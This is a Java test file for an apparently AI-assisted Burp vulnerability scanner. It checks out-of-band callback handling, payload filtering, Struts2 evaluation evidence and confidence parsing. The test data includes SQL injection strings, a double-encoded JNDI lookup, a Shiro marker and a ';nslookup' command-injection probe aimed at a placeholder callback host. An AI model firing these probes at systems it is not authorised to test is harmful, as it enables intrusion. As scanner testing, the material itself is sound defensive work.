        String shiroPayload = "{{SHIRO_URLLDNS:kPH+bIxk5D2deZiIxcaaaA==}}";
        String plainPayload = "1' AND SLEEP(6)-- -";
        check("开关打开时不拦任何载荷（外带载荷照常发）",
                !(Boolean) skip.invoke(null, oobPayload, true, "7f917734.log.nat.cloudns.ph")
                        && !(Boolean) skip.invoke(null, shiroPayload, true, "7f917734.log.nat.cloudns.ph"),
                "被拦了");
        check("开关关闭时占位符载荷被拦下（不发出去）",
                (Boolean) skip.invoke(null, oobPayload, false, null), "漏发了");
        check("开关关闭时 Shiro 标记载荷同样被拦下",
                (Boolean) skip.invoke(null, shiroPayload, false, null), "漏发了");
        check("开关关闭时普通载荷照常发送（关的是外带，不是整个扫描）",
                !(Boolean) skip.invoke(null, plainPayload, false, null), "被误拦");

        java.lang.reflect.Method block = AIEngine.class.getDeclaredMethod(
                "buildOastGenerationBlock", com.zackai.model.ScanTask.class, boolean.class);
        block.setAccessible(true);
        com.zackai.model.ScanTask task = new com.zackai.model.ScanTask(1, null, "GET", "http://t/");
        task.setOastHost("7f917734.log.nat.cloudns.ph");
        String closed = (String) block.invoke(engine, task, false);
        check("关闭时常量块明确写「已关闭」，不让模型以为是服务故障",
                closed.contains("已关闭") && !closed.contains("回连服务不可用"), closed);
        String noHost = (String) block.invoke(engine, new com.zackai.model.ScanTask(2, null, "GET", "http://t/"), true);
        check("开着但没拿到域名时说「服务不可用」", noHost.contains("未取得回连域名"), noHost);
        check("开着且拿到域名时给出域名与写法",
                ((String) block.invoke(engine, task, true)).contains("7f917734.log.nat.cloudns.ph"), "没给出域名");

        // 自检失败路径：连不上回连服务时必须返回失败结果而不是抛异常（插件加载与按钮都会走到）
        OASTClient offline = new OASTClient("http://127.0.0.1:1", "x.test");
        OASTClient.SelfTestResult failed = offline.selfTest();
        check("回连自检连不上服务时返回失败 + 原因（不抛异常）",
                !failed.ok && failed.message.contains("获取专属回连域名") && failed.records.isEmpty(),
                failed.message);

        // 本机 DNS 被代理/VPN 接管（fake-ip）时，自检必须能识别出来并说明「这不代表扫描不可用」
        java.lang.reflect.Method intercepted = OASTClient.class.getDeclaredMethod("looksIntercepted", String.class);
        intercepted.setAccessible(true);
        check("识别出代理假 IP（198.18.x.x，Clash/Surge 的 fake-ip 段）",
                (Boolean) intercepted.invoke(null, "198.18.0.105"), "没识别出来");
        check("识别出内网/回环地址（DNS 被本地应答）",
                (Boolean) intercepted.invoke(null, "127.0.0.1") && (Boolean) intercepted.invoke(null, "192.168.1.10"),
                "没识别出来");
        check("公网地址与解析不到（null）都不算被接管（否则真失败时会被误报成代理问题）",
                !(Boolean) intercepted.invoke(null, "203.0.113.5")
                        && !(Boolean) intercepted.invoke(null, new Object[]{null}),
                "误判了");
    }

    /**
     * Struts2 算术求值的代码判定：乘积在本次响应里出现、基线里没有，才算「表达式被求值」。
     *
     * <p>为什么必须由代码判：实测 AI 在这步判错过 —— 演示环境把原始输入也回显到页面上
     * （{@code your input id: %{100*100}}），同一响应里标签属性上却是 {@code <a id="10000">}，
     * 模型把回显当成了「表达式原样返回」，真漏洞被否掉。
     */
    static void checkStrutsArithmetic() {
        byte[] withProduct = "<a id=\"10000\">your input id: %{100*100}</a>".getBytes(java.nio.charset.StandardCharsets.UTF_8);
        byte[] baseline = "<a id=\"dany\">your input id: test</a>".getBytes(java.nio.charset.StandardCharsets.UTF_8);
        check("乘积出现在响应里、基线里没有 → 判为求值证据",
                "100*100 = 10000".equals(AIEngine.strutsArithmeticEvidence("%{100*100}", withProduct, baseline)),
                String.valueOf(AIEngine.strutsArithmeticEvidence("%{100*100}", withProduct, baseline)));
        check("成对载荷的第二个同样认（%{100*200} → 20000）",
                "100*200 = 20000".equals(AIEngine.strutsArithmeticEvidence("%{100*200}",
                        "<a id=\"20000\"></a>".getBytes(java.nio.charset.StandardCharsets.UTF_8), baseline)),
                "没认出来");
        check("基线里本来就有这个数字 → 不算证据（避免页面自带 10000 造成误报）",
                AIEngine.strutsArithmeticEvidence("%{100*100}", withProduct, withProduct) == null, "误判了");
        check("响应里没有乘积 → 不算",
                AIEngine.strutsArithmeticEvidence("%{100*100}", baseline, baseline) == null, "误判了");
        check("因子太小不认（%{1*1} 的 1 到处都是，会满天误报）",
                AIEngine.strutsArithmeticEvidence("%{1*1}",
                        "id=\"1\"".getBytes(java.nio.charset.StandardCharsets.UTF_8), baseline) == null, "误判了");
        check("非算术载荷一律不认（不干扰其它类型）",
                AIEngine.strutsArithmeticEvidence("1' AND SLEEP(6)-- -", withProduct, baseline) == null, "误判了");
        check("表达式原样回显但没算出来 → 不算（求值结果才作数）",
                AIEngine.strutsArithmeticEvidence("%{100*100}",
                        "your input id: %{100*100}".getBytes(java.nio.charset.StandardCharsets.UTF_8), baseline) == null,
                "误判了");
        // 步骤 1 拿到响应对象但没拿到响应体时基线是 null。缺一侧就没有可比性，不能只凭
        // 「响应里有这个乘积」定论 —— 这条证据是代码直判、置信度 100、不问 AI，而 10000
        // 这种数字在页面里顺带出现太常见，一旦这样判就是一条假的严重漏洞。
        check("缺基线时不算证据（少一侧就交给 AI，不能凭响应里出现乘积直接判 100% 严重漏洞）",
                AIEngine.strutsArithmeticEvidence("%{100*100}", withProduct, null) == null, "误判成漏洞了");
    }

    /** 暂停中删除任务不再卡死线程；外带轮询的失败原因随本次结果返回 */
    static void checkTaskCancelAndPoll() throws Exception {
        com.zackai.model.ScanTask task = new com.zackai.model.ScanTask(1, null, "GET", "http://t/");
        task.setStatus(com.zackai.model.ScanTask.TaskStatus.SCANNING);
        task.pause();
        check("暂停后 isPaused 为真（前置条件）", task.isPaused(), "没暂停");
        task.cancel();
        check("取消任务会一并解除暂停（否则扫描线程永远卡在暂停等待里，10 次之后池子耗尽）",
                !task.isPaused() && task.isCancelled(), "isPaused=" + task.isPaused());

        OASTClient client = new OASTClient("http://127.0.0.1:1", "x.test");
        OASTClient.PollResult bad = client.pollInteractionsWithError(null, "deadbeef");
        check("轮询失败原因随本次结果返回（不再读共享的 lastError）",
                bad.error != null && bad.records.isEmpty(), "error=" + bad.error);
        check("旧的 pollInteractions 仍然只给记录列表",
                client.pollInteractions(null, "deadbeef").isEmpty(), "非空");

        // 「测试回连」失败时不能把还能用的会话换掉
        OASTClient offline = new OASTClient("http://127.0.0.1:1", "log.nat.cloudns.ph.");
        OASTClient.Session good = OASTClient.testSession("aaaa1111", "tok", "log.nat.cloudns.ph.");
        java.lang.reflect.Field sessionField = OASTClient.class.getDeclaredField("session");
        sessionField.setAccessible(true);
        sessionField.set(offline, good);
        OASTClient.Session after = offline.refreshSession();
        check("重新申请失败时保留原会话（一次超时不该丢掉还能用的域名）",
                after == good, "会话被换成了 null");
    }

    /** 回连域名改写的边界：相邻重复域名、大小写折叠会变长的字符、双重编码的占位符 */
    static void checkOobEdgeCases() throws Exception {
        final String host = "7f917734.log.nat.cloudns.ph";
        final String label = "3f9ac1d2";
        String both = label + "." + host + "." + label + "." + host;
        check("相邻重复的域名不再抛 IndexOutOfBoundsException（原来会让整个任务中止）",
                both.equals(OASTClient.applyCallbackHost("oob.invalid.oob.invalid", host, label)),
                OASTClient.applyCallbackHost("oob.invalid.oob.invalid", host, label));
        check("域名与占位符相邻（oob.invalid.<域名>）同样正常",
                both.equals(OASTClient.applyCallbackHost("oob.invalid." + host, host, label)),
                OASTClient.applyCallbackHost("oob.invalid." + host, host, label));

        String withIdot = OASTClient.applyCallbackHost("oob.invalidİ", host, label);
        check("大小写折叠会变长的字符（İ）不再让占位符漏改",
                withIdot.contains(host) && withIdot.endsWith("İ"), withIdot);
        String atStart = OASTClient.applyCallbackHost("İoob.invalid", host, label);
        check("同类字符在开头时不再抛 StringIndexOutOfBoundsException",
                atStart.contains(host), atStart);

        String doubleEncoded = "%2524%257Bjndi%253Adns%253A%252F%252Foob%252Einvalid%257D";
        check("双重编码的占位符（oob%252Einvalid）也认得出是外带载荷",
                OASTClient.isOobPayload(doubleEncoded, host), "没认出来");
        check("双重编码的占位符同样改写成本次域名",
                OASTClient.applyCallbackHost(doubleEncoded, host, label).contains(host),
                OASTClient.applyCallbackHost(doubleEncoded, host, label));
        check("非外带载荷仍然一个字都不动",
                "1' OR '1'='1".equals(OASTClient.applyCallbackHost("1' OR '1'='1", host, label)), "被改了");
    }

    /**
     * 回连记录的查询策略（2026-09-27 定稿）：**每条载荷只查一次，不补查**。
     *
     * <p>此前有过三种补救，全部按「敏捷扫描」的要求去掉：查空补一次、查询失败补一次、收尾统一补一轮。
     * 定稿后：载荷发出 → 等 6 秒（{@code OOB_POLL_DELAY_SECONDS}）→ 查一次 → 按结果判定。
     * 代价写在代码常量那边：传播慢于 6 秒的这次查不到，那条载荷记「未判定」（不是「无漏洞」）。
     *
     * <p>用一个本地假回连服务**数调用次数** —— 这样「到底查了几次」是可观测的，不靠计时。
     */
    static void checkPollRetry() throws Exception {
        final int[] noRecordCalls = {0};
        final int[] recordCalls = {0};
        final int[] failingCalls = {0};
        com.sun.net.httpserver.HttpServer fake =
                com.sun.net.httpserver.HttpServer.create(new java.net.InetSocketAddress("127.0.0.1", 0), 0);
        // 一直「无记录」（真实服务无记录时返回字面量 null）
        fake.createContext("/tok", exchange -> {
            ++noRecordCalls[0];
            byte[] bytes = "null".getBytes(java.nio.charset.StandardCharsets.UTF_8);
            exchange.sendResponseHeaders(200, bytes.length);
            exchange.getResponseBody().write(bytes);
            exchange.close();
        });
        // 一直有记录
        fake.createContext("/rec", exchange -> {
            ++recordCalls[0];
            byte[] bytes = ("{\"0\":{\"ip\":\"6.6.6.6:6\",\"subdomain\":\"test.7f917734.log.nat.cloudns.ph.\","
                    + "\"time\":\"2026-09-21 16:44:17\"}}").getBytes(java.nio.charset.StandardCharsets.UTF_8);
            exchange.sendResponseHeaders(200, bytes.length);
            exchange.getResponseBody().write(bytes);
            exchange.close();
        });
        // 一直 500
        fake.createContext("/bad", exchange -> {
            ++failingCalls[0];
            exchange.sendResponseHeaders(500, -1);
            exchange.close();
        });
        fake.start();
        int port = fake.getAddress().getPort();
        try {
            OASTClient client = new OASTClient("http://127.0.0.1:" + port, OASTClient.DEFAULT_BASE_DOMAIN);
            AIEngine engine = new AIEngine(null, null, new LogPanel(), null);

            // 走**扫描路径用的那条策略**（pollForCallback），而不是直接调客户端 API ——
            // 否则钉不住「扫描到底用没用这条策略」
            OASTClient.PollResult empty = engine.pollForCallback(client, OASTClient.testSession(
                    "7f917734", "tok", OASTClient.DEFAULT_BASE_DOMAIN), "test");
            check("查空就按无记录处理，只查一次（不再补查）",
                    empty.error == null && empty.records.isEmpty() && noRecordCalls[0] == 1,
                    "记录 " + empty.records.size() + " 条，查了 " + noRecordCalls[0] + " 次");

            OASTClient.PollResult hit = engine.pollForCallback(client, OASTClient.testSession(
                    "7f917734", "rec", OASTClient.DEFAULT_BASE_DOMAIN), "test");
            check("这一次就查到记录时正常返回（一次查询足够）",
                    hit.error == null && hit.records.size() == 1 && recordCalls[0] == 1,
                    "记录 " + hit.records.size() + " 条，查了 " + recordCalls[0] + " 次");

            OASTClient.PollResult failed = engine.pollForCallback(client, OASTClient.testSession(
                    "7f917734", "bad", OASTClient.DEFAULT_BASE_DOMAIN), "test");
            check("查询失败也只查一次（不再重试），报错照旧（记「未判定」）",
                    failed.error != null && failingCalls[0] == 1,
                    "错误=" + failed.error + "，查了 " + failingCalls[0] + " 次");

            // 延迟秒数是用户明确要求的数（「发出后 6 秒查一次」），钉住它免得被顺手改掉
            java.lang.reflect.Field delay = AIEngine.class.getDeclaredField("OOB_POLL_DELAY_SECONDS");
            delay.setAccessible(true);
            check("回连查询的等待窗口是 6 秒", ((Integer) delay.get(null)) == 6, "实际 " + delay.get(null));

            // 错误串必须带上异常 message：只记类名时 "connect timed out" 与 "Read timed out"
            // 分不开（连不上/走代理 vs 连上了服务端不吐数据），排查只能猜 —— 2026-09-27 实测踩到
            OASTClient deadClient = new OASTClient("http://127.0.0.1:1", OASTClient.DEFAULT_BASE_DOMAIN);
            OASTClient.PollResult refused = deadClient.pollInteractionsWithError(
                    OASTClient.testSession("7f917734", "tok", OASTClient.DEFAULT_BASE_DOMAIN), "test");
            check("查询失败的错误串带上异常 message（不能只有一个类名）",
                    refused.error != null && refused.error.contains("ConnectException")
                            && refused.error.length() > "请求回连服务失败：ConnectException".length(),
                    "错误=" + refused.error);
        } finally {
            fake.stop(0);
        }
    }

    /** 上下文（供 main 调用） */
    static void checkPollRetrySection() throws Exception {
        System.out.println("\n--- 回连记录的查询策略（每条载荷只查一次）---");
        checkPollRetry();
    }

    /**
     * 两个核心契约的「数字」必须被钉住 —— 它们此前没有任何断言，改坏了四套自检照样全绿
     * （实测：门限 95 改成 50、每组合 9 条改成 8，都无人报警）。
     *
     * <p>报告门限：AI 验证那条路在离线环境里走不通（要真的调模型），所以这里钉「常量 + 提示词
     * 内插值」的一致性 —— 代码收紧而提示词没跟上（或反过来）会让模型与判定逻辑各说各话。
     * 每组合载荷数：常量被内插到四处，但「第2-5条」「第6-9条」「这 9 条」是手写的，
     * 改常量不同步就会给模型自相矛盾的指令。
     */
    static void checkReportGateAndPayloadCount() throws Exception {
        java.lang.reflect.Field gateField = AIEngine.class.getDeclaredField("CONFIDENCE_REPORT_THRESHOLD");
        gateField.setAccessible(true);
        int gate = (Integer) gateField.get(null);
        check("报告门限仍是 95（改这个数必须是有意的：它决定「发现漏洞」的下限）", gate == 95, "实际 " + gate);

        java.lang.reflect.Method verifyPrompt = AIEngine.class.getDeclaredMethod("getDefaultVerifyPrompt");
        verifyPrompt.setAccessible(true);
        String prompt = (String) verifyPrompt.invoke(new AIEngine(null, null, new LogPanel(), null));
        check("验证提示词里的门限与常量一致（改一处不会让两者脱节）",
                prompt.contains(">=" + gate + "%") && prompt.contains("\"confidence\":" + gate),
                "提示词里没有内插 " + gate);

        java.lang.reflect.Field countField = AIEngine.class.getDeclaredField("PAYLOAD_COUNT_PER_COMBO");
        countField.setAccessible(true);
        int count = (Integer) countField.get(null);
        check("每组合载荷数仍是 9（1 探测 + 4 主攻 + 4 WAF 绕过）", count == 9, "实际 " + count);

        java.lang.reflect.Method rules = AIEngine.class.getDeclaredMethod("step3CommonRules");
        rules.setAccessible(true);
        String text = (String) rules.invoke(null);
        check("第N条区间与拆分仍是 1 / 2-5 / 6-9（改拆分必须是有意的）",
                text.contains("第1条") && text.contains("第2-5条") && text.contains("第6-9条"),
                "区间标记不全");
        java.util.List<String> wrong = new java.util.ArrayList<String>();
        java.util.regex.Matcher m = java.util.regex.Pattern.compile("(\\d+) 条").matcher(text);
        while (m.find()) {
            if (!m.group(1).equals(String.valueOf(count))) {
                wrong.add(m.group());
            }
        }
        check("规则里每处手写的「N 条」都等于常量（不会出现「9 条」与「第6-8条」并存）",
                wrong.isEmpty(), String.valueOf(wrong));
    }

    /** 置信度按数值解析并夹到 0-100；类型名匹配不依赖默认 Locale */    static void checkConfidenceAndLocale() throws Exception {
        AIEngine engine = new AIEngine(null, null, new LogPanel(), null);
        java.lang.reflect.Method findInt = AIEngine.class.getDeclaredMethod("findIntField",
                com.google.gson.JsonObject.class, String[].class);
        findInt.setAccessible(true);
        java.lang.reflect.Method clamp = AIEngine.class.getDeclaredMethod("clampConfidence", Integer.class);
        clamp.setAccessible(true);

        check("字符串 \"9.5\" 解析成 9（此前去非数字变成 95，直接越过报告门限）",
                Integer.valueOf(9).equals(findInt.invoke(engine, conf("9.5"), new String[]{"confidence"})),
                String.valueOf(findInt.invoke(engine, conf("9.5"), new String[]{"confidence"})));
        check("字符串 \"95.5\" 解析成 95（此前是 955）",
                Integer.valueOf(95).equals(findInt.invoke(engine, conf("95.5"), new String[]{"confidence"})),
                String.valueOf(findInt.invoke(engine, conf("95.5"), new String[]{"confidence"})));
        check("\"95%\" 解析成 95",
                Integer.valueOf(95).equals(findInt.invoke(engine, conf("95%"), new String[]{"confidence"})),
                String.valueOf(findInt.invoke(engine, conf("95%"), new String[]{"confidence"})));
        check("解析不出来的值不猜（返回 null，交给别名与默认值）",
                findInt.invoke(engine, conf("很高"), new String[]{"confidence"}) == null, "猜了一个数");
        check("越界值被夹到 0-100",
                Integer.valueOf(0).equals(clamp.invoke(null, -5)) && Integer.valueOf(100).equals(clamp.invoke(null, 955)),
                "没夹住");

        // 布尔字段：词表必须自己判。JsonPrimitive.getAsBoolean() 对非布尔的 primitive
        // **从不抛异常**（等于 Boolean.parseBoolean(getAsString())），所以 "1"/"yes"/"on"
        // 全都会静默变成 false —— 以前那段词表写在 catch 里，是死代码，
        // 模型用这些写法回答时真漏洞被判成「不存在」。
        java.lang.reflect.Method findBool = AIEngine.class.getDeclaredMethod("findBooleanField",
                com.google.gson.JsonObject.class, String[].class);
        findBool.setAccessible(true);
        check("vulnerable 写成 1（数字）读成 true",
                Boolean.TRUE.equals(findBool.invoke(engine, bool("1"), new String[]{"vulnerable"})),
                String.valueOf(findBool.invoke(engine, bool("1"), new String[]{"vulnerable"})));
        check("vulnerable 写成 \"1\" 读成 true",
                Boolean.TRUE.equals(findBool.invoke(engine, bool("\"1\""), new String[]{"vulnerable"})),
                String.valueOf(findBool.invoke(engine, bool("\"1\""), new String[]{"vulnerable"})));
        check("vulnerable 写成 \"yes\" 读成 true",
                Boolean.TRUE.equals(findBool.invoke(engine, bool("\"yes\""), new String[]{"vulnerable"})),
                String.valueOf(findBool.invoke(engine, bool("\"yes\""), new String[]{"vulnerable"})));
        check("vulnerable 写成 \"on\" 读成 true",
                Boolean.TRUE.equals(findBool.invoke(engine, bool("\"on\""), new String[]{"vulnerable"})),
                String.valueOf(findBool.invoke(engine, bool("\"on\""), new String[]{"vulnerable"})));
        check("vulnerable 写成 \"off\" 读成 false",
                Boolean.FALSE.equals(findBool.invoke(engine, bool("\"off\""), new String[]{"vulnerable"})),
                String.valueOf(findBool.invoke(engine, bool("\"off\""), new String[]{"vulnerable"})));
        check("JSON 布尔照旧（\"true\"/\"false\"）",
                Boolean.TRUE.equals(findBool.invoke(engine, bool("true"), new String[]{"vulnerable"}))
                        && Boolean.FALSE.equals(findBool.invoke(engine, bool("false"), new String[]{"vulnerable"})),
                "读错了");
        check("认不出来的写法返回 null（不猜，交给下一个别名字段）",
                findBool.invoke(engine, bool("\"maybe\""), new String[]{"vulnerable"}) == null, "猜了一个值");
        java.lang.reflect.Method normBool = AIEngine.class.getDeclaredMethod("normalizeVerifyResponse",
                String.class, String.class);
        normBool.setAccessible(true);
        com.google.gson.JsonObject yesNorm = (com.google.gson.JsonObject) normBool.invoke(engine,
                "{\"vulnerable\":\"yes\",\"confidence\":99,\"vulnType\":\"SQL注入\"}", "SQL注入");
        check("整条回复里写 \"yes\" 时规范化结果也是 true（否则 99 分也进不了报告）",
                yesNorm != null && yesNorm.get("vulnerable").getAsBoolean(),
                yesNorm == null ? "null" : yesNorm.get("vulnerable").getAsString());

        java.lang.reflect.Method norm = AIEngine.class.getDeclaredMethod("normalizeVerifyResponse",
                String.class, String.class);
        norm.setAccessible(true);
        com.google.gson.JsonObject normalized = (com.google.gson.JsonObject) norm.invoke(engine,
                "{\"vulnerable\":true,\"confidence\":\"9.5\",\"vulnType\":\"SQL注入\",\"level\":\"HIGH\"}", "SQL注入");
        check("规范化后的置信度是 9 而不是 95（引号与否不再给出两种结论）",
                normalized != null && normalized.get("confidence").getAsInt() == 9,
                normalized == null ? "null" : normalized.get("confidence").getAsString());

        java.util.Locale original = java.util.Locale.getDefault();
        try {
            java.util.Locale.setDefault(new java.util.Locale("tr", "TR"));
            java.lang.reflect.Method fmt = AIEngine.class.getDeclaredMethod("formatVulnName", String.class);
            fmt.setAccessible(true);
            check("默认 Locale 为 tr_TR 时 \"sql_injection\" 仍解析成 SQL注入",
                    "SQL注入".equals(fmt.invoke(engine, "sql_injection")), String.valueOf(fmt.invoke(engine, "sql_injection")));
            java.lang.reflect.Method fixes = com.zackai.util.ReportGenerator.class
                    .getDeclaredMethod("getFixSuggestions", String.class);
            fixes.setAccessible(true);
            check("tr_TR 下修复建议仍能命中（不再退化成通用建议）",
                    fixes.invoke(null, "sql_injection") != null, "退化了");
        } finally {
            java.util.Locale.setDefault(original);
        }
    }

    /** step2 的窗口按字符硬截：压缩成一行的响应不能整包塞进提示词 */
    static void checkStep2WindowCap() throws Exception {
        java.lang.reflect.Field f = AIEngine.class.getDeclaredField("STEP2_INFO_WINDOW");
        f.setAccessible(true);
        int window = (Integer) f.get(null);

        AIEngine engine = new AIEngine(null, null, new LogPanel(), null);
        java.lang.reflect.Method m = AIEngine.class.getDeclaredMethod("buildRequestInfo",
                burp.IHttpRequestResponse.class, boolean.class);
        m.setAccessible(true);
        String minified = "{\"data\":\"" + "x".repeat(300000) + "\"}";     // 一行 300KB，没有换行
        String request = "POST /a HTTP/1.1\r\nHost: x\r\nContent-Length: 1\r\n\r\nz";
        burp.IHttpRequestResponse stub = (burp.IHttpRequestResponse) java.lang.reflect.Proxy.newProxyInstance(
                OASTHarness.class.getClassLoader(), new Class[]{burp.IHttpRequestResponse.class},
                (p, method, args) -> {
                    if ("getRequest".equals(method.getName())) {
                        return request.getBytes(java.nio.charset.StandardCharsets.UTF_8);
                    }
                    if ("getResponse".equals(method.getName())) {
                        return ("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n" + minified)
                                .getBytes(java.nio.charset.StandardCharsets.UTF_8);
                    }
                    throw new UnsupportedOperationException(method.getName());
                });
        String info = (String) m.invoke(engine, stub, true);
        check("压缩成一行的响应被硬截到窗口大小（此前按整行累加，30 万字符整包进提示词）",
                info.length() < window + 3000, "提示词长度 " + info.length());
        check("截断处有明确标注", info.contains("已截断"), "没有标注");
    }

    private static com.google.gson.JsonObject conf(String value) {
        com.google.gson.JsonObject o = new com.google.gson.JsonObject();
        o.addProperty("confidence", value);
        return o;
    }

    /** 造一个只含 vulnerable 字段的对象；参数是**原始 JSON 片段**（数字 / 带引号的字符串 / 布尔） */
    private static com.google.gson.JsonObject bool(String rawValue) {
        return com.google.gson.JsonParser.parseString("{\"vulnerable\":" + rawValue + "}").getAsJsonObject();
    }

    /**
     * 外带载荷的判定：有回连记录 → 程序直接判漏洞（不问 AI）；无记录 → 只有在响应也没差异时才算「无漏洞」；
     * 通道不可用 → 未判定（既不是漏洞，也不是「无漏洞」）。
     */
    static void checkOobDirectDecision() throws Exception {
        java.lang.reflect.Field delayField = AIEngine.class.getDeclaredField("OOB_CONFIRMED_CONFIDENCE");
        delayField.setAccessible(true);
        int oobConfidence = (Integer) delayField.get(null);
        check("回连确认的置信度是满分（确定性证据，不再让模型给分）", oobConfidence == 100, "实际 " + oobConfidence);

        // 有记录 → 直接判漏洞
        Outcome direct = runOobCase(true, "AAAA", "AAAA", 200L, false);
        check("有回连记录 → 直接记漏洞（不再调用 AI）",
                direct.recorded == 1 && direct.log.contains("[步骤6]") && !direct.log.contains("AI 验证失败"),
                direct.log.replace('\n', ' '));
        check("回连确认的漏洞置信度是 100、等级按类型给（命令注入=严重）",
                direct.recorded == 1 && direct.vuln != null && direct.vuln.getConfidence() == 100
                        && direct.vuln.getLevel() == com.zackai.model.ScanTask.VulnLevel.CRITICAL,
                direct.vuln == null ? "没有漏洞记录" : (direct.vuln.getConfidence() + " / " + direct.vuln.getLevel()));
        check("漏洞描述里写明了回连证据（专属域名 + 记录原文）",
                direct.vuln != null && direct.vuln.getDescription() != null
                        && direct.vuln.getDescription().contains("3f9ac1d2.7f917734.log.nat.cloudns.ph")
                        && direct.vuln.getDescription().contains("回连记录"),
                direct.vuln == null ? "没有漏洞记录" : String.valueOf(direct.vuln.getDescription()));
        check("判定后通知了监听器（表格才能立刻显示）", direct.listenerCalls == 1, "监听器调用 " + direct.listenerCalls);

        // 无记录 + 响应与基线一致 → 无漏洞，不调 AI
        Outcome identical = runOobCase(false, "AAAA", "AAAA", 200L, false);
        check("无记录且响应与基线一致 → 判无漏洞（跳过 AI 验证）",
                identical.recorded == 0 && identical.log.contains("无变化即无漏洞"), identical.log.replace('\n', ' '));

        // 无记录 + 响应有差异 → 仍交给 AI（回显、报错里出现域名等证据不能被丢掉）
        Outcome differs = runOobCase(false, "AAAA", "BBBB", 200L, false);
        check("无记录但响应有差异 → 仍然走 AI 验证（这条通道不能砍掉）",
                differs.recorded == 0 && differs.log.contains("AI 验证失败"), differs.log.replace('\n', ' '));

        // 通道不可用 + 无差异 → 未判定（既不是漏洞，也不是「无漏洞」）
        Outcome broken = runOobCase(false, "AAAA", "AAAA", 200L, true);
        check("回连通道不可用且响应无差异 → 记「未判定」，不记「无漏洞」",
                broken.recorded == 0 && broken.log.contains("未判定") && !broken.log.contains("无变化即无漏洞"),
                broken.log.replace('\n', ' '));

        // 同组合对照参与跳过规则：注：键必须与生产代码算出来的**完全一致**（位置归一化 + 类型归一化），
        // 否则对照取不到，整条特性静默失效 —— 所以这里用同一个方法算键，不手写字符串
        java.lang.reflect.Method posKeyOf = AIEngine.class.getDeclaredMethod("anchorPositionKey", String.class, byte[].class);
        posKeyOf.setAccessible(true);
        java.lang.reflect.Method typeName = AIEngine.class.getDeclaredMethod("formatVulnName", String.class);
        typeName.setAccessible(true);
        String comboKey = posKeyOf.invoke(null, "id", null) + "|"
                + typeName.invoke(new AIEngine(null, null, new LogPanel(), null), "COMMAND_INJECTION");

        java.util.Map<String, Object> controlDiffers = new java.util.HashMap<String, Object>();
        controlDiffers.put(comboKey, probeAnchor(";nslookup oob.invalid", "CCCC", 200L, 0));
        Outcome withControl = runOobCase(false, "AAAA", "AAAA", 200L, false, controlDiffers);
        check("与基线一致、但与同组合对照不同 → 仍然走 AI 验证（成对证据不能被跳过吃掉）",
                withControl.recorded == 0 && withControl.log.contains("AI 验证失败"),
                withControl.log.replace('\n', ' '));

        java.util.Map<String, Object> controlSame = new java.util.HashMap<String, Object>();
        controlSame.put(comboKey, probeAnchor(";nslookup oob.invalid", "AAAA", 200L, 0));
        Outcome withSameControl = runOobCase(false, "AAAA", "AAAA", 200L, false, controlSame);
        check("与基线、对照都一致 → 判无漏洞（跳过 AI 验证，与旧行为相同）",
                withSameControl.recorded == 0 && withSameControl.log.contains("无变化即无漏洞"),
                withSameControl.log.replace('\n', ' '));

        // 通道不可用那一支**不能**被同组合的差异掀翻：它的语义是「这次的响应本身毫无变化」，
        // 盲外带载荷的响应一致本来就说明不了问题 —— 那一支必须只用基线口径
        // 对照自己判成漏洞 → 作废；别的载荷判成漏洞不影响它。
        // 动机：Struts2 / SSTI / 命令注入的探测载荷本身就是证明载荷，那种「对照」里装的是
        // 利用成功的产物，拿它当「正常业务响应」会诱导模型把真证据读成应用常态（假阴性）
        java.util.Map<String, Object> selfVoid = new java.util.HashMap<String, Object>();
        selfVoid.put(comboKey, probeAnchor(";nslookup oob.invalid", "AAAA", 200L, 1));
        runOobCase(true, "AAAA", "AAAA", 200L, false, selfVoid);
        check("对照自己判成漏洞 → 作废（它已经不可能再当无害参照）",
                selfVoid.isEmpty(), "还剩 " + selfVoid.size() + " 条");

        java.util.Map<String, Object> otherVoid = new java.util.HashMap<String, Object>();
        otherVoid.put(comboKey, probeAnchor(";nslookup oob.invalid", "AAAA", 200L, 7));
        runOobCase(true, "AAAA", "AAAA", 200L, false, otherVoid);
        check("别的载荷判成漏洞时对照仍然有效（只作废「自己」）",
                otherVoid.size() == 1, "被误删了");

        Outcome brokenWithControl = runOobCase(false, "AAAA", "AAAA", 200L, true, controlDiffers);
        check("回连通道不可用 + 对照不同 → 仍然是「未判定」，不被同组合的差异带偏",
                brokenWithControl.recorded == 0 && brokenWithControl.log.contains("未判定")
                        && !brokenWithControl.log.contains("AI 验证失败"),
                brokenWithControl.log.replace('\n', ' '));

        // 通道不可用 + 模型也没能从响应确认（走完 AI 之后判否）→ 结论行必须写「未判定」。
        // 这条路径在离线自检里到不了 AI 那一层（AI 调用要联网），所以钉的是那句文案本身：
        // 它不能复用 noVuln 的 key，否则用户会把「证据不足」读成「目标没问题」
        // 参数个数要与生产调用一致（只传 payloadTag）：多传的参数 MessageFormat 会忽略，
        // 于是模板哪天又被加回一个 {1}，这里照样绿、生产却会抛异常 —— 那样的断言是假的
        String unjudged = com.zackai.i18n.Msg.t("log.step5.oobUnjudgedNoConfirm",
                "载荷2/9 → Fastjson反序列化");
        check("回连通道不可用且模型未确认时，结论行写「未判定」而不是「未发现漏洞」",
                unjudged.contains("未判定") && !unjudged.contains("未发现漏洞"), unjudged);
        com.zackai.i18n.Msg.setLang("en");
        String unjudgedEn;
        try {
            unjudgedEn = com.zackai.i18n.Msg.t("log.step5.oobUnjudgedNoConfirm", "payload 2/9");
        } finally {
            com.zackai.i18n.Msg.setLang("zh");
        }
        check("新文案的英文侧是真英文（不是照抄中文）", !unjudgedEn.contains("未判定"), unjudgedEn);
    }

    /** 一次判定的结果，便于断言 */
    static class Outcome {
        int recorded;
        int listenerCalls;
        String log = "";
        com.zackai.model.VulnResult vuln;
    }

    /**
     * 跑一次 processTestResult（外带场景）。
     *
     * @param baseline  基线响应体
     * @param response  本次响应体
     * @param failure   是否模拟「回连通道不可用」
     */
    static Outcome runOobCase(boolean records, String baseline, String response, long elapsedMs, boolean failure) throws Exception {
        return runOobCase(records, baseline, response, elapsedMs, failure, null);
    }

    /**
     * 同 {@link #runOobCase(boolean, String, String, long, boolean)}，但带一份「同组合对照锚点」
     * （键 → {@link #probeAnchor}）。对照在真实扫描里由载荷循环写入，这里手工喂进去。
     */
    static Outcome runOobCase(boolean records, String baseline, String response, long elapsedMs, boolean failure,
                              java.util.Map<String, Object> anchors) throws Exception {
        final com.zackai.ui.LogPanel panel = new com.zackai.ui.LogPanel();
        final Outcome out = new Outcome();
        AIEngine.VulnDiscoveryListener listener = (t, v) -> {
            out.listenerCalls++;
            out.vuln = v;
        };
